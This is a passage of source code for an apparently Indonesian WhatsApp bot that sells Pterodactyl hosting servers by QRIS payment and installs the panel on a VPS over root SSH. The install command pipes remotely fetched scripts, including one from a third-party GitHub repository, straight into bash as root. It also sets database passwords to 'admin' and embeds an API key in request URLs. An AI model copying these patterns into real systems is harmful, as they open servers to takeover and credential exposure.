          if (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
            await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
            await cupen.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
            db.users[m.sender].status_deposit = false;
            delete db.users[m.sender].saweria;
          }
        }, 300000); // 5 menit
      }
    };

    await db.users[m.sender].saweria.exp();

    // =======================
    // Cek Pembayaran
    // =======================
    while (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
      await sleep(8000);
      const resultcek = await axios.get(`https://aanapi.my.id/api/orkut/cekstatus?apikey=aanboy&merchant=${idmerchant}&keyorkut=${apikeyorkut}`);
      const req = await resultcek.data;

      if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
        db.users[m.sender].status_deposit = false;
        await clearInterval(db.users[m.sender].saweria.exp);
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* 1gb Server
        `}, { quoted: db.users[m.sender].saweria.msg });

        // =======================
        // Buat Pengguna
        // =======================
        let email = username + "@gmail.com";
        let password = crypto.randomBytes(4).toString('hex');

        let f = await fetch(global.domain + "/api/application/users", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + global.apikey
          },
          body: JSON.stringify({
            email: email,
            username: username.toLowerCase(),
            first_name: username,
            last_name: "❀SalwaCantik❀",
            language: "en",
            password: password
          })
        });
        let data = await f.json();
        if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

        let user = data.attributes;

        // =======================
        // Buat Server
        // =======================
        let f3 = await fetch(global.domain + "/api/application/servers", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + global.apikey
          },
          body: JSON.stringify({
            name: username,
            description: "Unlimited Server",
            user: user.id,
            egg: 15,
            docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
            startup: "npm start",
            environment: {
              INST: "npm",
              USER_UPLOAD: "0",
              AUTO_UPDATE: "0",
              CMD_RUN: "npm start"
            },
            limits: {
              memory: 1024,
              swap: 0,
              disk: 102400,
              io: 500,
              cpu: 0
            },
            feature_limits: {
              databases: 5,
              backups: 3,
              allocations: 1
            },
            deploy: {
              locations: [1],
              dedicated_ip: false,
              port_range: []
            }
          })
        });
        let serverRes = await f3.json();
        if (serverRes.errors) {
          console.error('Server Creation Error:', serverRes.errors);
          return m.reply(JSON.stringify(serverRes.errors[0], null, 2));
        }

        // Kirim informasi server ke pengguna
        let server = serverRes.attributes;
        let teks = `
*Berhasil Membuat Server ✅*

*• ID Server :* ${server.id}
*• Nama :* ${server.name}
*• Username :* ${user.username}
*• Password :* ${password}
*• Login :* ${global.domain}
*• Expired :* 1 Bulan
`;
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: teks }, { quoted: null });
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
        delete db.users[m.sender].saweria;
      }
    }
  } catch (error) {
    console.error('Error:', error);
    m.reply('❌ Gagal memproses transaksi. Silakan coba lagi.');
  }
}
break;

case 'buy2gb': {
  if (m.isGroup) return m.reply("Pembelian hanya bisa dilakukan melalui private chat.");
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan. Ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

  const harga = 5000; // Harga paket Unlimited
  try {
    // =======================
    // Generate Username Acak
    // =======================
    const generateRandomUsername = () => {
      const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
      let randomUsername = '';
      for (let i = 0; i < 8; i++) { // Panjang username acak (8 karakter)
        randomUsername += characters.charAt(Math.floor(Math.random() * characters.length));
      }
      return randomUsername;
    };

    const username = generateRandomUsername(); // Buat username acak
    console.log('Generated Username:', username); // Debugging: Cek username

    // =======================
    // Buat QRIS
    // =======================
    const pay = await (await fetch(`https://aanapi.my.id/api/orkut/createpayment?apikey=aanboy&amount=${harga}&codeqr=${qrisorkut}`)).json();
    const expirationTime = new Date(pay.result.expirationTime);

    const teks3 = `
*乂 INFORMASI PEMBAYARAN*
 
 *• ID :* ${pay.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(pay.result.amount)}
 *• Barang :* 2Gb Server
 *• Expired :* 5 menit

*Note :* 
QRIS pembayaran hanya berlaku dalam 5 menit. Jika sudah melewati 5 menit, pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil, bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan.
`;
    let msgQr = await cupen.sendMessage(m.chat, { image: { url: pay.result.qrImageUrl }, caption: teks3 }, { quoted: m });

    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: pay.result.transactionId,
      amount: pay.result.amount.toString(),
      exp: function () {
        setTimeout(async () => {
          if (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
            await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
            await cupen.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
            db.users[m.sender].status_deposit = false;
            delete db.users[m.sender].saweria;
          }
        }, 300000); // 5 menit
      }
    };

    await db.users[m.sender].saweria.exp();

    // =======================
    // Cek Pembayaran
    // =======================
    while (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
      await sleep(8000);
      const resultcek = await axios.get(`https://aanapi.my.id/api/orkut/cekstatus?apikey=aanboy&merchant=${idmerchant}&keyorkut=${apikeyorkut}`);
      const req = await resultcek.data;

      if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
        db.users[m.sender].status_deposit = false;
        await clearInterval(db.users[m.sender].saweria.exp);
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* 2Gb Server
        `}, { quoted: db.users[m.sender].saweria.msg });

        // =======================
        // Buat Pengguna
        // =======================
        let email = username + "@gmail.com";
        let password = crypto.randomBytes(4).toString('hex');

        let f = await fetch(global.domain + "/api/application/users", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + global.apikey
          },
          body: JSON.stringify({
            email: email,
            username: username.toLowerCase(),
            first_name: username,
            last_name: "Unlimited",
            language: "en",
            password: password
          })
        });
        let data = await f.json();
        if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

        let user = data.attributes;

        // =======================
        // Buat Server
        // =======================
        let f3 = await fetch(global.domain + "/api/application/servers", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + global.apikey
          },
          body: JSON.stringify({
            name: username,
            description: "2Gb Server",
            user: user.id,
            egg: 15,
            docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
            startup: "npm start",
            environment: {
              INST: "npm",
              USER_UPLOAD: "0",
              AUTO_UPDATE: "0",
              CMD_RUN: "npm start"
            },
            limits: {
              memory: 2024,
              swap: 0,
              disk: 102400,
              io: 500,
              cpu: 0
            },
            feature_limits: {
              databases: 5,
              backups: 3,
              allocations: 1
            },
            deploy: {
              locations: [1],
              dedicated_ip: false,
              port_range: []
            }
          })
        });
        let serverRes = await f3.json();
        if (serverRes.errors) {
          console.error('Server Creation Error:', serverRes.errors);
          return m.reply(JSON.stringify(serverRes.errors[0], null, 2));
        }

        // Kirim informasi server ke pengguna
        let server = serverRes.attributes;
        let teks = `
*Berhasil Membuat Server ✅*

*• ID Server :* ${server.id}
*• Nama :* ${server.name}
*• Username :* ${user.username}
*• Password :* ${password}
*• Login :* ${global.domain}
*• Expired :* 1 Bulan
`;
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: teks }, { quoted: null });
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
        delete db.users[m.sender].saweria;
      }
    }
  } catch (error) {
    console.error('Error:', error);
    m.reply('❌ Gagal memproses transaksi. Silakan coba lagi.');
  }
}
break;

case 'buy3gb': {
  if (m.isGroup) return m.reply("Pembelian hanya bisa dilakukan melalui private chat.");
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan. Ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

  const harga = 3000; // Harga paket Unlimited
  try {
    // =======================
    // Generate Username Acak
    // =======================
    const generateRandomUsername = () => {
      const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
      let randomUsername = '';
      for (let i = 0; i < 8; i++) { // Panjang username acak (8 karakter)
        randomUsername += characters.charAt(Math.floor(Math.random() * characters.length));
      }
      return randomUsername;
    };

    const username = generateRandomUsername(); // Buat username acak
    console.log('Generated Username:', username); // Debugging: Cek username

    // =======================
    // Buat QRIS
    // =======================
    const pay = await (await fetch(`https://aanapi.my.id/api/orkut/createpayment?apikey=aanboy&amount=${harga}&codeqr=${qrisorkut}`)).json();
    const expirationTime = new Date(pay.result.expirationTime);

    const teks3 = `
*乂 INFORMASI PEMBAYARAN*
 
 *• ID :* ${pay.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(pay.result.amount)}
 *• Barang :* 3gb Server
 *• Expired :* 5 menit

*Note :* 
QRIS pembayaran hanya berlaku dalam 5 menit. Jika sudah melewati 5 menit, pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil, bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan.
`;
    let msgQr = await cupen.sendMessage(m.chat, { image: { url: pay.result.qrImageUrl }, caption: teks3 }, { quoted: m });

    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: pay.result.transactionId,
      amount: pay.result.amount.toString(),
      exp: function () {
        setTimeout(async () => {
          if (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
            await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
            await cupen.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
            db.users[m.sender].status_deposit = false;
            delete db.users[m.sender].saweria;
          }
        }, 300000); // 5 menit
      }
    };

    await db.users[m.sender].saweria.exp();

    // =======================
    // Cek Pembayaran
    // =======================
    while (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
      await sleep(8000);
      const resultcek = await axios.get(`https://aanapi.my.id/api/orkut/cekstatus?apikey=aanboy&merchant=${idmerchant}&keyorkut=${apikeyorkut}`);
      const req = await resultcek.data;

      if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
        db.users[m.sender].status_deposit = false;
        await clearInterval(db.users[m.sender].saweria.exp);
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* 3Gb Server
        `}, { quoted: db.users[m.sender].saweria.msg });

        // =======================
        // Buat Pengguna
        // =======================
        let email = username + "@gmail.com";
        let password = crypto.randomBytes(4).toString('hex');

        let f = await fetch(global.domain + "/api/application/users", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + global.apikey
          },
          body: JSON.stringify({
            email: email,
            username: username.toLowerCase(),
            first_name: username,
            last_name: "Unlimited",
            language: "en",
            password: password
          })
        });
        let data = await f.json();
        if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

        let user = data.attributes;

        // =======================
        // Buat Server
        // =======================
        let f3 = await fetch(global.domain + "/api/application/servers", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + global.apikey
          },
          body: JSON.stringify({
            name: username,
            description: "3Gb Server",
            user: user.id,
            egg: 15,
            docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
            startup: "npm start",
            environment: {
              INST: "npm",
              USER_UPLOAD: "0",
              AUTO_UPDATE: "0",
              CMD_RUN: "npm start"
            },
            limits: {
              memory: 3240,
              swap: 0,
              disk: 102400,
              io: 500,
              cpu: 0
            },
            feature_limits: {
              databases: 5,
              backups: 3,
              allocations: 1
            },
            deploy: {
              locations: [1],
              dedicated_ip: false,
              port_range: []
            }
          })
        });
        let serverRes = await f3.json();
        if (serverRes.errors) {
          console.error('Server Creation Error:', serverRes.errors);
          return m.reply(JSON.stringify(serverRes.errors[0], null, 2));
        }

        // Kirim informasi server ke pengguna
        let server = serverRes.attributes;
        let teks = `
*Berhasil Membuat Server ✅*

*• ID Server :* ${server.id}
*• Nama :* ${server.name}
*• Username :* ${user.username}
*• Password :* ${password}
*• Login :* ${global.domain}
*• Expired :* 1 Bulan
`;
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: teks }, { quoted: null });
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
        delete db.users[m.sender].saweria;
      }
    }
  } catch (error) {
    console.error('Error:', error);
    m.reply('❌ Gagal memproses transaksi. Silakan coba lagi.');
  }
}
break;

case 'buy4gb': {
  if (m.isGroup) return m.reply("Pembelian hanya bisa dilakukan melalui private chat.");
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan. Ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

  const harga = 5000; // Harga paket Unlimited
  try {
    // =======================
    // Generate Username Acak
    // =======================
    const generateRandomUsername = () => {
      const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
      let randomUsername = '';
      for (let i = 0; i < 8; i++) { // Panjang username acak (8 karakter)
        randomUsername += characters.charAt(Math.floor(Math.random() * characters.length));
      }
      return randomUsername;
    };

    const username = generateRandomUsername(); // Buat username acak
    console.log('Generated Username:', username); // Debugging: Cek username

    // =======================
    // Buat QRIS
    // =======================
    const pay = await (await fetch(`https://aanapi.my.id/api/orkut/createpayment?apikey=aanboy&amount=${harga}&codeqr=${qrisorkut}`)).json();
    const expirationTime = new Date(pay.result.expirationTime);

    const teks3 = `
*乂 INFORMASI PEMBAYARAN*
 
 *• ID :* ${pay.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(pay.result.amount)}
 *• Barang :* 4gb Server
 *• Expired :* 5 menit

*Note :* 
QRIS pembayaran hanya berlaku dalam 5 menit. Jika sudah melewati 5 menit, pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil, bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan.
`;
    let msgQr = await cupen.sendMessage(m.chat, { image: { url: pay.result.qrImageUrl }, caption: teks3 }, { quoted: m });

    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: pay.result.transactionId,
      amount: pay.result.amount.toString(),
      exp: function () {
        setTimeout(async () => {
          if (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
            await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
            await cupen.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
            db.users[m.sender].status_deposit = false;
            delete db.users[m.sender].saweria;
          }
        }, 300000); // 5 menit
      }
    };

    await db.users[m.sender].saweria.exp();

    // =======================
    // Cek Pembayaran
    // =======================
    while (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
      await sleep(8000);
      const resultcek = await axios.get(`https://aanapi.my.id/api/orkut/cekstatus?apikey=aanboy&merchant=${idmerchant}&keyorkut=${apikeyorkut}`);
      const req = await resultcek.data;

      if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
        db.users[m.sender].status_deposit = false;
        await clearInterval(db.users[m.sender].saweria.exp);
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* 4gb Server
        `}, { quoted: db.users[m.sender].saweria.msg });

        // =======================
        // Buat Pengguna
        // =======================
        let email = username + "@gmail.com";
        let password = crypto.randomBytes(4).toString('hex');

        let f = await fetch(global.domain + "/api/application/users", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + global.apikey
          },
          body: JSON.stringify({
            email: email,
            username: username.toLowerCase(),
            first_name: username,
            last_name: "Unlimited",
            language: "en",
            password: password
          })
        });
        let data = await f.json();
        if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

        let user = data.attributes;

        // =======================
        // Buat Server
        // =======================
        let f3 = await fetch(global.domain + "/api/application/servers", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + global.apikey
          },
          body: JSON.stringify({
            name: username,
            description: "Unlimited Server",
            user: user.id,
            egg: 15,
            docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
            startup: "npm start",
            environment: {
              INST: "npm",
              USER_UPLOAD: "0",
              AUTO_UPDATE: "0",
              CMD_RUN: "npm start"
            },
            limits: {
              memory: 4240,
              swap: 0,
              disk: 102400,
              io: 500,
              cpu: 0
            },
            feature_limits: {
              databases: 5,
              backups: 3,
              allocations: 1
            },
            deploy: {
              locations: [1],
              dedicated_ip: false,
              port_range: []
            }
          })
        });
        let serverRes = await f3.json();
        if (serverRes.errors) {
          console.error('Server Creation Error:', serverRes.errors);
          return m.reply(JSON.stringify(serverRes.errors[0], null, 2));
        }

        // Kirim informasi server ke pengguna
        let server = serverRes.attributes;
        let teks = `
*Berhasil Membuat Server ✅*

*• ID Server :* ${server.id}
*• Nama :* ${server.name}
*• Username :* ${user.username}
*• Password :* ${password}
*• Login :* ${global.domain}
*• Expired :* 1 Bulan
`;
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: teks }, { quoted: null });
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
        delete db.users[m.sender].saweria;
      }
    }
  } catch (error) {
    console.error('Error:', error);
    m.reply('❌ Gagal memproses transaksi. Silakan coba lagi.');
  }
}
break;

case 'buy5gb': {
  if (m.isGroup) return m.reply("Pembelian hanya bisa dilakukan melalui private chat.");
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan. Ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

  const harga = 5000; // Harga paket Unlimited
  try {
    // =======================
    // Generate Username Acak
    // =======================
    const generateRandomUsername = () => {
      const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
      let randomUsername = '';
      for (let i = 0; i < 8; i++) { // Panjang username acak (8 karakter)
        randomUsername += characters.charAt(Math.floor(Math.random() * characters.length));
      }
      return randomUsername;
    };

    const username = generateRandomUsername(); // Buat username acak
    console.log('Generated Username:', username); // Debugging: Cek username

    // =======================
    // Buat QRIS
    // =======================
    const pay = await (await fetch(`https://aanapi.my.id/api/orkut/createpayment?apikey=aanboy&amount=${harga}&codeqr=${qrisorkut}`)).json();
    const expirationTime = new Date(pay.result.expirationTime);

    const teks3 = `
*乂 INFORMASI PEMBAYARAN*
 
 *• ID :* ${pay.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(pay.result.amount)}
 *• Barang :* 5Gb Server
 *• Expired :* 5 menit

*Note :* 
QRIS pembayaran hanya berlaku dalam 5 menit. Jika sudah melewati 5 menit, pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil, bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan.
`;
    let msgQr = await cupen.sendMessage(m.chat, { image: { url: pay.result.qrImageUrl }, caption: teks3 }, { quoted: m });

    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: pay.result.transactionId,
      amount: pay.result.amount.toString(),
      exp: function () {
        setTimeout(async () => {
          if (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
            await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
            await cupen.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
            db.users[m.sender].status_deposit = false;
            delete db.users[m.sender].saweria;
          }
        }, 300000); // 5 menit
      }
    };

    await db.users[m.sender].saweria.exp();

    // =======================
    // Cek Pembayaran
    // =======================
    while (db.users[m.sender].status_deposit && db.users[m.sender].saweria) {
      await sleep(8000);
      const resultcek = await axios.get(`https://aanapi.my.id/api/orkut/cekstatus?apikey=aanboy&merchant=${idmerchant}&keyorkut=${apikeyorkut}`);
      const req = await resultcek.data;

      if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
        db.users[m.sender].status_deposit = false;
        await clearInterval(db.users[m.sender].saweria.exp);
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* 5gb Server
        `}, { quoted: db.users[m.sender].saweria.msg });

        // =======================
        // Buat Pengguna
        // =======================
        let email = username + "@gmail.com";
        let password = crypto.randomBytes(4).toString('hex');

        let f = await fetch(global.domain + "/api/application/users", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + global.apikey
          },
          body: JSON.stringify({
            email: email,
            username: username.toLowerCase(),
            first_name: username,
            last_name: "Unlimited",
            language: "en",
            password: password
          })
        });
        let data = await f.json();
        if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

        let user = data.attributes;

        // =======================
        // Buat Server
        // =======================
        let f3 = await fetch(global.domain + "/api/application/servers", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + global.apikey
          },
          body: JSON.stringify({
            name: username,
            description: "Unlimited Server",
            user: user.id,
            egg: 15,
            docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
            startup: "npm start",
            environment: {
              INST: "npm",
              USER_UPLOAD: "0",
              AUTO_UPDATE: "0",
              CMD_RUN: "npm start"
            },
            limits: {
              memory: 5240,
              swap: 0,
              disk: 102400,
              io: 500,
              cpu: 0
            },
            feature_limits: {
              databases: 5,
              backups: 3,
              allocations: 1
            },
            deploy: {
              locations: [1],
              dedicated_ip: false,
              port_range: []
            }
          })
        });
        let serverRes = await f3.json();
        if (serverRes.errors) {
          console.error('Server Creation Error:', serverRes.errors);
          return m.reply(JSON.stringify(serverRes.errors[0], null, 2));
        }

        // Kirim informasi server ke pengguna
        let server = serverRes.attributes;
        let teks = `
*Berhasil Membuat Server ✅*

*• ID Server :* ${server.id}
*• Nama :* ${server.name}
*• Username :* ${user.username}
*• Password :* ${password}
*• Login :* ${global.domain}
*• Expired :* 1 Bulan
`;
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: teks }, { quoted: null });
        await cupen.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
        delete db.users[m.sender].saweria;
      }
    }
  } catch (error) {
    console.error('Error:', error);
    m.reply('❌ Gagal memproses transaksi. Silakan coba lagi.');
  }
}
break;

case 'installpanel': {
if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner');
if (!text) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await cupen.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('CupenNode\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('cupen Node\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}
break  

case 'uninstallpanel': {
if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
